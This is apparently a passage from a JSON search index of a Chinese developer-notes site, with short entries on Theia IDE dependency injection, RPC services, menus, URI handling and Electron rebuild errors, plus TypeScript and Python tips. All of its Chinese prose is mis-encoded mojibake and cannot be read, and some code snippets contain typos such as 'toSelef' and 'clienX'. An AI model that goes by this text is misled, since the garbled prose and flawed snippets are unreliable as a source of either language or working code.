ä¸­ç¼–å†™æœåŠ¡æ—¶, è§£è€¦çš„è§’åº¦ä¹Ÿå¯ä»¥ä½¿ç”¨ä¾èµ–æ³¨å…¥ ä¸ªäººä¹ æƒ¯å°†æ¥å£éƒ½å®šä¹‰åœ¨common: // åç«¯æä¾›çš„æœåŠ¡ export const IUtilService = Symbol('IUtilService') export interface IUtilService extends RpcServer<IUtilClient>{ getHash(data: string): Promise<string> getRandomStr(): Promise<string> setClient(client: IUtilClient): void } å°†æœåŠ¡å®šä¹‰ä¸ºæˆå‘˜å˜é‡ä¸æ„é€ å‡½æ•°å‚æ•°çš„åŒºåˆ« å½“é€šè¿‡ @inject å±æ€§æ³¨å…¥æ—¶,å¦‚æœç›´æ¥å®šä¹‰ä¸ºç±»æˆå‘˜å˜é‡, åœ¨æ„é€ å‡½æ•°ä¸­è®¿é—®è¯¥æˆå‘˜å˜é‡æ—¶,æœ‰å¯èƒ½ä»æœªè¢«åˆå§‹åŒ–, å‡ºç° undefined è€Œå¦‚æœåœ¨æ„é€ å‡½æ•°å‚æ•°ä¸­å®šä¹‰,åˆ™å¯ä»¥ä¿è¯åœ¨æ„é€ å‡½æ•°ä½“æ‰§è¡Œå‰è¢«åˆå§‹åŒ– ç±»æˆå‘˜å˜é‡ä¼šåœ¨è°ƒç”¨æ„é€ å‡½æ•°ä¹‹å‰å£°æ˜,ä½†ä¸ä¼šæå‰åˆå§‹åŒ– æ„é€ å‡½æ•°å‚æ•°ä¼šåœ¨è°ƒç”¨æ„é€ å‡½æ•°æ—¶ç”±æ³¨å…¥å™¨è¿›è¡Œåˆå§‹åŒ– æ„é€ å‡½æ•°ä½“å†…,å‚æ•°çš„å€¼å·²ç»è¢«åˆå§‹åŒ–,ä½†æˆå‘˜å˜é‡å¯èƒ½è¿˜æœªè¢«åˆå§‹åŒ– æ•…è¿˜æ˜¯ä½¿ç”¨æ„é€ å‡½æ•°å‚æ•°æ¥æ”¶æ³¨å…¥çš„å€¼å¥½ä¸€äº›: constructor(@inject(Foo) private foo: Foo) { // foo å·²è¢«åˆå§‹åŒ– } ä½†æ˜¯å…¶å®å³ä½¿æ˜¯åœ¨æ„é€ å‡½æ•°ä¸­æ³¨å…¥, ä¹Ÿå¯è§†ä½œæˆå‘˜å˜é‡, ä¸éœ€è¦åœ¨æ„é€ å‡½æ•°çš„å®ç°ä¸­, æ‰‹åŠ¨èµ‹å€¼, é»˜è®¤å°±å¯ä»¥ this è°ƒç”¨ è´¡çŒ®ç‚¹ä½¿ç”¨ æ™®é€šæœåŠ¡æ³¨å…¥ç›´æ¥ @inject æœåŠ¡åå³å¯ è´¡çŒ®ç‚¹æ˜¯æ³¨å…¥è´¡çŒ®ç‚¹ ContributionProvider åç§°åŠ ä¸€ä¸ª @named(è´¡çŒ®ç‚¹åŸºç±») : @inject(ContributionProvider) @named(IExampleContribute) // IExampleContribute æ˜¯è´¡çŒ®ç‚¹æ¥å£ protected readonly exampleCs: ContributionProvider<IExampleContribute> é™¤äº†è´¡çŒ®ç‚¹åŸºç±», éƒ½æ˜¯å†…ç½®çš„: import {inject, injectable, named, postConstruct } from \"@theia/core/shared/inversify\"; import {ContributionProvider} from \"@theia/core\"; è®°å¾—åœ¨å…¥å£æ–‡ä»¶ç»‘å®š: // æŠŠè´¡çŒ®ç‚¹æ¥å£ç»‘å®š bindContributionProvider(bind, IExampleContribute) // æ¯ä¸€ä¸ªå®ç°éƒ½æ­£å¸¸ç»‘å®š, æ­¤å¤„ä¸èƒ½rebind, ä¸ç„¶ä¼šè¦†ç›–å‰é¢å·²ç»‘å®šçš„è´¡çŒ®ç‚¹ bind(A).toSelef().inSingleScope() bind(IExampleContribute).toService(A) è·å–æ‰€æœ‰è´¡çŒ®ç‚¹: this.exampleCs.getContributions() åªbindè‡ªå·±æ•ˆæœ åœ¨ Theia æ¡†æ¶ä¸­ï¼Œå¦‚æœä½ åªä½¿ç”¨ bind(A).toSelf().inSingletonScope() å°†æœåŠ¡ A ç»‘å®šåˆ°è‡ªèº«å¹¶è®¾ç½®ä¸ºå•ä¾‹ä½œç”¨åŸŸï¼Œé€šå¸¸ä¸éœ€è¦ä½¿ç”¨ bind(A).toService(A) bind(A).toSelf().inSingletonScope() è¡¨ç¤ºå°†æœåŠ¡ A ç»‘å®šåˆ°è‡ªèº«ï¼Œå¹¶åœ¨å•ä¾‹ä½œç”¨åŸŸä¸­åˆ›å»ºå®ä¾‹ã€‚ è¿™æ„å‘³ç€æ¯æ¬¡è¯·æ±‚æœåŠ¡ A æ—¶ï¼Œéƒ½ä¼šè¿”å›åŒä¸€ä¸ªå®ä¾‹ã€‚ bind(A).toService(A) åˆ™æ˜¯å°†æœåŠ¡ A ç»‘å®šåˆ°æœåŠ¡ A çš„å®ç°ã€‚ è¿™åœ¨ä¸€äº›å¤æ‚çš„ä¾èµ–æ³¨å…¥åœºæ™¯ä¸­å¯èƒ½ä¼šç”¨åˆ°ï¼Œä½†åœ¨ä¸€èˆ¬æƒ…å†µä¸‹å¹¶ä¸æ˜¯å¿…éœ€çš„ã€‚ å› æ­¤ï¼Œå¦‚æœä½ åªéœ€è¦åˆ›å»ºå®ä¾‹å¹¶åœ¨éœ€è¦çš„åœ°æ–¹è¿›è¡Œæ³¨å…¥ï¼Œ bind(A).toSelf().inSingletonScope() å°±è¶³å¤Ÿäº†ï¼Œæ— éœ€é¢å¤– bind(A).toService(A)","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Dependent-injection-and-problem.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Dependent-injection-and-problem.html"},{"title":"å‰åç«¯é€šä¿¡-å‰ç«¯è°ƒç”¨åç«¯æœåŠ¡","text":"å‰åç«¯æœåŠ¡éƒ½å°†ä»¥ ä¾èµ–æ³¨å…¥ çš„å½¢å¼å®šä¹‰. æ­¤å¤„å°†ä»‹ç», ä½¿ç”¨RPCé€šä¿¡, å°†åç«¯çš„æœåŠ¡æä¾›ç»™å‰ç«¯è°ƒç”¨. ç”¨ä¾‹, åœ¨é¡¹ç›®æ ¹çš„ package.json å®šä¹‰äº†å·¥ä½œåŒº: \"workspaces\": [ \"src/@ide/*\" ] åœ¨ src/@ide/ ä¸‹æ–°å¢ä¸€ä¸ªæ‹“å±• you-watch : mkdir src/@ide/you-watch å·¥ä½œåŒºå¯ä»¥åµŒå¥—, å³å¯ä»¥åœ¨è‡ªå®šä¹‰çš„æ‹“å±•ä¸‹å†å®šä¹‰å·¥ä½œåŒº æ­¤æ‹“å±•åä¸º @ide/you-watch (æ‹“å±•ä¸‹çš„ package.json å®šä¹‰): \"name\": \"@ide/you-watch\" ç„¶å, æ–°å»º backen å’Œ browser ç›®å½•, å¹¶å®ç°å‰åç«¯ç›¸åº”åŠŸèƒ½, å¤§æ¦‚ç›®å½•ç»“æ„: $ tree src -L 2 src â”œâ”€â”€ backend â”‚ â”œâ”€â”€ index.ts â”‚ â”œâ”€â”€ util-service.ts â”‚ â””â”€â”€ utils.ts â”œâ”€â”€ browser â”‚ â”œâ”€â”€ index.ts â”‚ â”œâ”€â”€ util-client.ts â”‚ â””â”€â”€ you-watch-contribution.ts â””â”€â”€ common â””â”€â”€ service.ts index å³é»˜è®¤å…¥å£æ–‡ä»¶ ä¸»è¦åœ¨äºç»‘å®š, åç«¯çš„å…¥å£æ–‡ä»¶: // backend/index.ts import {ContainerModule} from '@theia/core/shared/inversify' import {IUtilService, IUtilClient, IUtilServicePath} from \"../common/service\"; import {UtilService} from \"./util-service\"; import {ConnectionHandler, RpcConnectionHandler} from \"@theia/core\"; export default new ContainerModule( (bind, unbind, isBound, rebind, unbindAsync, onActivation, onDeactivation) => { bind(IUtilService).to(UtilService).inSingletonScope() // åç«¯é€šä¿¡å®ç° bind(ConnectionHandler).toDynamicValue( ({container}) => new RpcConnectionHandler<IUtilClient>( IUtilServicePath, (client) => { const utilService: IUtilService = container.get(IUtilService) utilService.setClient(client) return utilService } ) ) } ) è¿™é‡Œä½¿ç”¨rpcé€šä¿¡, IUtilClient åªæ˜¯ä¸€ç”±å‰ç«¯å®ç°çš„é€šä¿¡ä¸­ä»‹, å‰ç«¯å¯å®ç°ç©º: // browser/util-client.ts import {injectable} from \"@theia/core/shared/inversify\"; @injectable() export class UtilClient implements IUtilClient{ } å‰ç«¯çš„ç»‘å®šå®ç°: // browser/index.ts /** * Generated using theia-extension-generator */ import {YouWatchCommandContribution, YouWatchMenuContribution} from \"./you-watch-contribution\"; import { CommandContribution, MenuContribution } from '@theia/core/lib/common'; import { ContainerModule } from '@theia/core/shared/inversify'; import {IUtilClient, IUtilService, IUtilServicePath} from \"../common/service\"; import {UtilClient} from \"./util-client\"; import {WebSocketConnectionProvider} from \"@theia/core/lib/browser\"; export default new ContainerModule(bind => { // add your contribution bindings here bind(CommandContribution).to(YouWatchCommandContribution).inSingletonScope() bind(MenuContribution).to(YouWatchMenuContribution).inSingletonScope() // å‰ç«¯é€šä¿¡å®ç° bind(IUtilClient).to(UtilClient).inSingletonScope() bind(IUtilService).toDynamicValue( (context) => { const client = context.container.get<IUtilClient>(IUtilClient) const connection = context.container.get(WebSocketConnectionProvider) return connection.createProxy<IUtilService>( IUtilServicePath, client ) } ) }); è¿™é‡Œæ˜¯å…³è”åˆ°åç«¯å‘å¸ƒçš„rpcæœåŠ¡.","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Front-end-communication-front-end-call-back-end-service.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Front-end-communication-front-end-call-back-end-service.html"},{"title":"å¼•å…¥è‡ªå®šä¹‰cssæ–‡ä»¶","text":"åœ¨æ‹“å±•æ ¹ç›®å½•(src)ä¸‹çš„ browser ä¸‹æ–°å»ºä¸€ä¸ª style æ–‡ä»¶å¤¹, å…¶ä¸­æ–°å»ºè‡ªå·±çš„css, å¦‚ my-style.css å¦‚æœæ²¡æœ‰å®šä¹‰å‰ç«¯æœåŠ¡, ç›´æ¥åœ¨æ‰©å±•çš„ package.json ä¸­é…ç½®: \"theiaExtensions\": [ { \"frontend\": \"lib/browser/style/my-style.css\" } ] å¦‚æœæœ‰å®šä¹‰å‰ç«¯æœåŠ¡å¦‚ index.ts , é‚£ä¹ˆ package.json ä¸­å·²ç»æœ‰: \"theiaExtensions\": [ { \"frontend\": \"lib/browser/index\" } ] è¿™ä¸ªæ—¶å€™åªéœ€è¦ç®€å•çš„åœ¨ index.ts å¯¼å…¥å³å¯: import '../../src/browser/style/my-style.css' å› ä¸ºlibæ˜¯ç¼–è¯‘çš„, ä¸‹é¢æ²¡æœ‰css, æ‰€ä»¥å¾—ä»æ ¹ç›®å½•é‡æ–°è¿› æ³¨è§£ å¦‚æœæ˜¯è¦†ç›–theiaæ¡†æ¶åŸæœ‰çš„, ä¸ç”¨å¯¼","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Introduce-custom-CSS-files.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Introduce-custom-CSS-files.html"},{"title":"æ‰“å¼€/åˆ‡æ¢ç¼–è¾‘å™¨","text":"ä½¿ç”¨ EditorManager , ä½ç½®: import {EditorManager} from \"@theia/editor/lib/browser\"; éœ€è¦çŸ¥é“å½“å‰URI, ç„¶åè°ƒç”¨ open import URI from '@theia/core/lib/common/uri' @inject(EditorManager) _editorManager: EditorManager const uri: URI this._editorManager.open(uri) è°ƒç”¨æ—¶å€™ä¼šè‡ªåŠ¨åˆ¤æ–­å­˜ä¸å­˜åœ¨, è‹¥å­˜åœ¨å°±åˆ‡æ¢è¿‡å» æ³¨è§£ åæ§½ä¸‹theiaçš„æŸäº›å†…ç½®çš„æœºåˆ¶æœ‰ç‚¹åäººç±», å•¥éƒ½å¾—é‡å†™ä¸€ä¸‹, æ‰å¥½ç”¨.","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Open-switch-editor.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Open-switch-editor.html"},{"title":"æ‰“å¼€ç›®å½•/æ–‡ä»¶é€‰æ‹©å™¨","text":"ä½¿ç”¨å†…ç½® FileDialogService çš„ showOpenDialog å³å¯: import {FileDialogService, OpenFileDialogProps} from '@theia/filesystem/lib/browser' import {FileService} from '@theia/filesystem/lib/browser/file-service' @inject(FileDialogService) protected readonly _fileDialogService: FileDialogService @inject(FileService) protected readonly _fileService: FileService async selectSomeFile(){ const selectOptions: OpenFileDialogProps = { title: 'è¯·é€‰æ‹©æ–‡ä»¶', canSelectFiles: true, canSelectFolders: false, canSelectMany: false, // è‹¥è¦è‡ªå®šä¹‰é€‰æ‹©æ–‡ä»¶ç±»å‹ filters: { 'static': ['css', 'js'], 'typeScript': ['ts', 'tsx'] } } const startPath = await this._fileService.resolve(URI.fromFilePath('/usr/local/xxx')) await this._fileDialogService.showOpenDialog( selectOptions, startPath ) }","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Open-the-directory-&-file-selector.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Open-the-directory-&-file-selector.html"},{"title":"ç»“åˆelectronæ—¶å€™çš„æŠ¥é”™","text":"æŠ¥é”™ Module did not self-register: '.../node_modules/drivelist/build/Release/drivelist.node'. å‚è€ƒ: https://github.com/balena-io-modules/drivelist/issues/389#issuecomment-850784173 issues ä¸Šé¢çœ‹åˆ°çš„æ˜¯: Install electron-rebuild run cd ./node_modules/drivelist && ../.bin/electron-rebuild rebuild å…¶å®ä¸ä¸‹é¢çš„åº”è¯¥æ˜¯ä¸€ä¸ªé—®é¢˜(å¯èƒ½ä¹Ÿè¦åˆ é™¤lib, ä¸‹æ¬¡é‡åˆ°å†è¯•è¯•) æŠ¥é”™ Cannot find module '../build/Debug/pty.node' å‚è€ƒ: https://github.com/Microsoft/node-pty/issues/256#issuecomment-454292439 è§£å†³: npm install --save-dev electron-rebuild ç„¶ååœ¨ package.json çš„ scripts å¢åŠ : \"scripts\": { \"rebuild:node\": \"electron-rebuild -f -w node-pty\" } åˆ é™¤é¡¹ç›®æ ¹ç›®å½•ä¸‹ lib`(å¯ä¸åˆ é™¤ä¹Ÿè¡Œå¥½åƒ), æ‰§è¡Œ ``npm run rebuild:node` åœ¨é‡å†™ç¼–è¯‘ä¸€ä¸‹, æ¯”å¦‚æˆ‘è¿™é‡Œæ˜¯ npm run prepare å³å¯: \"scripts\": { \"prepare\": \"yarn run clean && yarn build && yarn run download:plugins\", \"clean\": \"theia clean\", \"build\": \"theia rebuild:electron && theia build --mode development\", \"rebuild\": \"theia rebuild:electron --cacheRoot ./.theia_build/cache && theia build --mode development\", \"start\": \"theia start --plugins=local-dir:plugins --remote-debugging-port=9222\", \"download:plugins\": \"theia download:plugins\", \"rebuild:node\": \"electron-rebuild -f -w node-pty\" }","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Report-error-when-combining-Electron.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Report-error-when-combining-Electron.html"},{"title":"è‡ªå®šä¹‰ä»»æ„ä½ç½®çš„é¼ æ ‡å³é”®ä¸Šä¸‹æ–‡èœå•","text":"è¯´æ˜: å³, å½“é¼ æ ‡å³é”®å•å‡»æ—¶, åœ¨å•å‡»çš„ä½ç½®è§¦å‘çš„èœå•æ  (å°±åƒWinæ¡Œé¢é¼ æ ‡å³é”®è§¦å‘çš„é‚£ç©æ„å„¿) é¦–å…ˆéœ€è¦æ³¨å†Œä¸€ä¸ªèœå•æŒ‡ä»¤(èœå•çš„æŒ‡ä»¤, ä¸å®é™…çš„æŒ‡ä»¤): /* å…ˆæ³¨å†Œä¸€ä¸ªè‡ªå®šä¹‰çš„èœå• */ namespace CustomContextMenuCommand { const category = 'custom-context-menu-command' export const HELLO_COMMAND = Command.toDefaultLocalizedCommand({ id: 'custom:command', category: category, label: 'hello command' }) } å°†èœå•ä¸æŒ‡ä»¤æ³¨å†Œåˆ°è´¡çŒ®ç‚¹: @injectable() export class CustomAContextMenu implements CommandContribution, MenuContribution{ constructor( @inject(MessageService) private readonly _messageService: MessageService, ) { } registerCommands(commands: CommandRegistry) { commands.registerCommand( CustomContextMenuCommand.HELLO_COMMAND, {execute: async (...args) => { await this._messageService.info('è‡ªå®šä¹‰ä¸Šä¸‹æ–‡èœå• - ä½ ç…å•¥') }} ) } registerMenus(menus: MenuModelRegistry) { menus.registerMenuAction( [...NAVIGATOR_CONTEXT_MENU, '_1_hello'], // CommonMenus.EDIT_CONTEXT_MENU, { commandId: CustomContextMenuCommand.HELLO_COMMAND.id, label: CustomContextMenuCommand.HELLO_COMMAND.label, } ) } } è¿™é‡Œæ˜¯æ³¨å†Œåˆ°ç³»ç»Ÿå·¦ä¾§çš„å¯¼èˆªæ ä½ç½®çš„æ–‡ä»¶èµ„æºç®¡ç†å™¨, é¢„å®šä¹‰çš„èœå•åä¸º NAVIGATOR_CONTEXT_MENU , è¦åœ¨è¿™é‡Œè§¦å‘, ç›´æ¥æ”¾è¿™é‡Œå³å¯ æ•ˆæœ: å¦‚ä½•æ‰‹åŠ¨ä½¿ç”¨ä»£ç è§¦å‘? æ³¨å…¥render: // import {ContextMenuRenderer} from \"@theia/core/lib/browser\"; @inject(ContextMenuRenderer) readonly _contextMenuRender: ContextMenuRenderer, è°ƒç”¨æ‰“å¼€: openMenu(e) { this._contextMenuRender.render({ menuPath: NAVIGATOR_CONTEXT_MENU, anchor: {x: e.clienX, y: e.clientY}, // åæ ‡ä½ç½® args: [], // å‚æ•° }) } è¿™é‡Œçš„è°ƒç”¨å¯ä»¥æ”¾åˆ°è¯¸å¦‚divçš„å³é”®äº‹ä»¶å», æ¯”å¦‚: <div class=\"container\" style=\"flex-direction: row;\" oncontextmenu={openMenu(this)}> </div>","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Right--click-on-the-mouse-of-any-location.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Right--click-on-the-mouse-of-any-location.html"},{"title":"å‰åç«¯è·¯å¾„ä¼ é€’URI/URL","text":"URI: èµ„æºæ ‡è¯†ç¬¦ URL: å…·ä½“çš„URI,åŒ…å«äº†ç½‘ç»œåè®®ä¿¡æ¯,å¦‚http,httpsç­‰ å‰åç«¯é€šä¿¡ä¼ é€’èµ„æºè·¯å¾„æ—¶,é€šå¸¸éƒ½å»ºè®®ä½¿ç”¨ URI è€Œä¸æ˜¯ URL ä¸»è¦åŸå› æœ‰: URIè¡¨ç¤ºèµ„æºæ ‡è¯†ç¬¦,åªå…³æ³¨æ ‡è¯†èµ„æº,è€Œä¸é™å®šä½¿ç”¨çš„åè®®ã€‚è¿™æ›´é€šç”¨ã€‚ URLæ˜¯ä¸€ç§å…·ä½“çš„URI,åŒ…å«äº†ç½‘ç»œåè®®ä¿¡æ¯,å¦‚http,httpsç­‰ã€‚è¿™å¯¹èµ„æºæ ‡è¯†æ¥è¯´æ˜¯éå¿…éœ€çš„ã€‚ å‰åç«¯å¯ä»¥ä½¿ç”¨ä¸åŒçš„åè®®è®¿é—®åŒä¸€ä¸ªèµ„æºæ ‡è¯†ç¬¦,URIå¯ä»¥å…¼å®¹ã€‚ URIæœ‰ä¸€ä¸ªé€šç”¨çš„è¯­æ³•æ ¼å¼,æ–¹ä¾¿è§£æå¤„ç†ã€‚å¹¶ä¸”å¯ä»¥åŒ…å«éç½‘ç»œèµ„æº,å¦‚æœ¬åœ°æ–‡ä»¶è·¯å¾„ã€‚ URLç¼–ç æœ‰äº›å­—ç¬¦å¦‚ç©ºæ ¼ç­‰ä¼šè¢«ç¼–ç ,è€ŒURIå¯ä»¥ä¿ç•™åŸå§‹å­—ç¬¦ã€‚ URIå¯ä»¥æ–¹ä¾¿åœ°æ˜ å°„åˆ°ä¸åŒçš„å…·ä½“URL,ä¸ºåº”ç”¨å¸¦æ¥æ›´å¤§çµæ´»æ€§ã€‚ è®¸å¤šç¨‹åºåº“å’Œæ¡†æ¶ä¹Ÿæ¨èä½¿ç”¨URIæ ¼å¼è¡¨ç¤ºèµ„æºæ ‡è¯†ç¬¦ã€‚ URIä¸URLçš„ç›¸äº’è½¬æ¢ æ³¨è§£ æ­¤å¤„çš„URIä¸º vscode-uri æ¨¡å—ä¸‹çš„ URI theiaæ¡†æ¶çš„URIä¸º import URI from '@theia/core/lib/common/uri' URIå­—ç¬¦ä¸², scheme + path çš„å½¢å¼, å¦‚: const uriStr = file:///c:/users/bob URLè·¯å¾„å­—ç¬¦ä¸², å¦‚: const urlStr = /c:/users/bob æœ¬åœ°è·¯å¾„å­—ç¬¦ä¸², çº¯è·¯å¾„å¦‚: const localPathStr = c:/users/bob URIå­—ç¬¦ä¸² ==> URIå¯¹è±¡: const uriIns = URI.parse(uriStr) URIå­—ç¬¦ä¸² ==> URLå¯¹è±¡: const urlIns = new URL(uriStr) // å¦‚æœè¦è·å–urlå­—ç¬¦ä¸² const urlStr = urlIns.pathname URIå¯¹è±¡è½¬æ¢ä¸ºæœ¬åœ°è·¯å¾„å­—ç¬¦ä¸², æ¯”å¦‚theiaæ¡†æ¶æœ‰æä¾›Pathå¯¹è±¡, æ˜¯å¯¹ import URI from 'vscode-uri' è¿›è¡Œçš„ä¸€ä¸ªå°è£…, é‚£ä¹ˆåœ¨theiaä¸­å¯ä»¥ç›´æ¥: const convertedStr = uriIns.path.fspath() è‹¥éæ¡†æ¶ç¯å¢ƒ, åé¢å†è¯´ URLå­—ç¬¦ä¸² ==> URIå¯¹è±¡: const uriIns = URI.file(urlStr) // theiaæ¡†æ¶æä¾›äº† const uriIns = URI.fromFilePath(urlStr) æ³¨è§£ æœ‰æ—¶å€™å­—ç¬¦ä¸²å¯èƒ½æ˜¯è¢«URIç¼–ç äº†, éœ€è¦è§£ç : // ä¸¤ç§å¥½åƒéƒ½å¯ä»¥, ä¸è®°å¾—äº† decodeURIComponent(urlStr) decodeURIComponent(uriStr) ä»€ä¹ˆæ—¶å€™éœ€è¦è½¬æ¢? å½“URIå­—ç¬¦ä¸²æœ‰é—®é¢˜çš„æ—¶å€™, å…ˆç”Ÿæˆä¸ªURLå¯¹è±¡, ç„¶åå†è½¬æ¢ä¸ºURIå¯¹è±¡: // æœ‰ä¸ªæœ‰é—®é¢˜çš„URIå­—ç¬¦ä¸², æ¯”å¦‚ file:/c:/users/bob const issuesUriStr = 'file:/c:/users/bob' const urlStr = decodeURIComponent((new URL(issuesUriStr)).pathname) const uriIns = URI.file(urlStr) theiaä¸é€šè¿‡åç«¯æ‹¼æ¥è·¯å¾„ theiaçš„URIå°è£…çš„Pathå¯¹è±¡æä¾›æ­¤åŠŸèƒ½: const _uriIns: URI const _baseName: string // ä¸»è¦æ˜¯è¿™ä¸€æ­¥ _path: Path = _uriIns.path.join(_baseName) _newUriIns: URI = URI.fromFilePath(_path.fspath())","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-The-front-and-rear-path-transmission-URI.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-The-front-and-rear-path-transmission-URI.html"},{"title":"theiaå¯åŠ¨ç™½å±","text":"å¯ä»¥ä»å®˜æ–¹ä»“åº“çš„æäº¤è®°å½•ä¸­å‘ç°ç«¯å€ª: https://github.com/eclipse-theia/theia/commit/45a0953d7eed19cd311840281f17999d268ba7cf , ä½†, å…¶å®å¯¹æ²¡æœ‰é…ç½® preloadTemplate çš„é¡¹ç›®å½±å“ä¸å¤§, ä½†æ˜¯å¦‚æœé…ç½®äº†, é‚£å¯åŠ¨æ—¶, ä¼šå¾ˆæ—©å°±æ‰“å¼€ä¸€ä¸ªåˆå§‹åŒ–çª—å£, ä¸”è¿™ä¸ªæ—¶å€™åªèƒ½ç”¨ç»™çš„é»˜è®¤çš„èƒŒæ™¯è‰², ä¸è¿‡å¯ä»¥é€šè¿‡é…ç½® \"showWindowEarly\": false æ¥ä¸å¯åŠ¨è¿™ä¸ªæ—©æœŸçª—å£, æš‚æ—¶è¿™æ ·è§£å†³å§: \"theia\": { \"target\": \"electron\", \"frontend\": { \"config\": { \"applicationName\": \"Theia Electron Example\", \"electron\": { \"showWindowEarly\": false } } }, \"generator\": { \"config\": { \"preloadTemplate\": \"./resources/preload.html\" } } },","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Theia-start-the-white-screen.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Theia-start-the-white-screen.html"},{"title":"ä½¿ç”¨diffç¼–è¾‘å™¨æ‰“å¼€ä¸¤ä¸ªæ–‡ä»¶å¯¹æ¯”","text":"é¦–å…ˆ, è¦æœ‰ä¸¤ä¸ªURIè·¯å¾„ (theiaå°è£…çš„URI: import URI from '@theia/core/lib/common/uri' ): import URI from '@theia/core/lib/common/uri' const leftUri = new URI('file:///c:/users/bob.txt') const rightUri = new URI('file:///c:/users/bob2.txt') ç„¶åä½¿ç”¨DiffUriså°è£…è¿™ä¸¤ä¸ªURI: import {DiffUris} from '@theia/core/lib/browser/diff-uris' const diffU: URI = DiffUris.encode(leftUri, rightUri) ç„¶ååœ¨ä½¿ç”¨openæ‰“å¼€: import {OpenerService, open} from '@theia/core/lib/browser' @inject(OpenerService) readonly _openerService: OpenerService open(this._openerService, diffU)","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Use-Diff-editor-to-open-two-file-comparison.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Use-Diff-editor-to-open-two-file-comparison.html"},{"title":"theiaä½¿ç”¨å¤–éƒ¨æµè§ˆå™¨æ‰“å¼€é“¾æ¥","text":"ä½¿ç”¨å†…ç½®çš„ OpenerService: import {OpenerService} from \"@theia/core/lib/browser\"; import {URI} from \"@theia/core\"; @inject(OpenerService) protected readonly _openService: OpenerService protected openExternalBrowser(link: string){ // è¿™é‡Œé“¾æ¥å¿…é¡»æ˜¯ https://baidu.com/ è¿™ç§ const linkUri = new URI(link) this._openService.getOpener(linkUri).then( (opener) => { opener.open(linkUri) } ) }","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Use-the-external-browser-to-open-the-link.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Use-the-external-browser-to-open-the-link.html"},{"title":"yarn install å‡ºç°node-gypæŠ¥é”™","text":"æŠ¥é”™å†…å®¹å¤§è‡´å¦‚ä¸‹: xxxx/node_module/nsfw: Command failed. Exit code: 1 Command: node-gyp rebuild Arguments: æˆ‘ç”¨çš„æ˜¯yarn, è¯•è¿‡ç›´æ¥: yarn global add node-gyp å¤±è´¥ æœ€ç»ˆå¶ç„¶å‘ç°: npm i -g node-gyp è§£å†³äº†, å¥‡æ€ª....","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-frame-theia-question-Yarn-Install-appears-node-gyp-error.html","loc":"/yq-doc-source-docs-front-end-frame-theia-question-Yarn-Install-appears-node-gyp-error.html"},{"title":"å¯¼å…¥json","text":"å¯¹äºtsé¡¹ç›®è€Œè¨€ åœ¨ tsconfig.json å¢åŠ ä»¥ä¸‹å†…å®¹: { \"compilerOptions\": { \"resolveJsonModule\": true } } ç„¶åç›´æ¥: import * as schemeData from 'xxxxx.json' å³å¯","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-question-Import-json.html","loc":"/yq-doc-source-docs-front-end-question-Import-json.html"},{"title":"tsçš„!ä¸?","text":"è¡¨ç¤ºå˜é‡å¯èƒ½ä¸ºç©º. !ç”¨æ³• ç”¨åœ¨å˜é‡å‰è¡¨ç¤ºå–å ç”¨åœ¨èµ‹å€¼çš„å†…å®¹åæ—¶ï¼Œä½¿nullå’Œundefinedç±»å‹å¯ä»¥èµ‹å€¼ç»™å…¶ä»–ç±»å‹å¹¶é€šè¿‡ç¼–è¯‘ï¼Œè¡¨ç¤ºè¯¥å˜é‡å€¼å¯ç©º ?ç”¨æ³• å¯ä»¥è¡¨ç¤ºå¯é€‰å‚æ•° å¦‚: interface IDemo { x?: number } å¯é˜²å¾¡æ€§ç¼–ç¨‹: const a = fetch(...) || {} // å‡è®¾aæ˜¯ä»åç«¯æ‹¿åˆ°çš„ä¸€ä¸ªå¯¹è±¡ç±»å‹æ•°æ® const unsafeData = a.b.c // è¿™æ ·å†™æ—¶ä¸å®‰å…¨çš„ï¼Œæ— æ³•ç¡®ä¿bæ˜¯å¦æœ‰å€¼ï¼Œå¦‚æœä¸ºç©ºåˆ™b.cä¼šè¿›è¡ŒæŠ¥é”™ const safeData = a?.b?.c // å®é™…ä¸Šå°±æ˜¯ç›¸å½“äº const safeData = a && a.b && a.b.c å…¶ä»–è§ /docs/å‰ç«¯/typescript/é—®å·ä¸å¹å·","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-question-TS's-exclamation-mark-and-question-mark.html","loc":"/yq-doc-source-docs-front-end-question-TS's-exclamation-mark-and-question-mark.html"},{"title":"å­—ç¬¦ä¸²è¡¥0","text":"å·¦å¯¹é½, å³ä¾§è¡¥0: In [2]: \"123\".ljust(5, \"0\") Out[2]: '12300' å³å¯¹é½, å·¦ä¾§è¡¥0: In [3]: \"123\".rjust(5, \"0\") Out[3]: '00123' æˆ–è€…: In [4]: \"123\".zfill(5) Out[4]: '00123' æˆ–è€…ä½¿ç”¨%: In [5]: \"%05d\" % 123 Out[5]: '00123'","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-conclusion-of-issue-String-supplement-0.html","loc":"/yq-doc-source-docs-rear-end-python-conclusion-of-issue-String-supplement-0.html"},{"title":"Dijkstra(è¿ªæ°æ–¯ç‰¹æ‹‰)ç®—æ³•","text":"Dijkstra 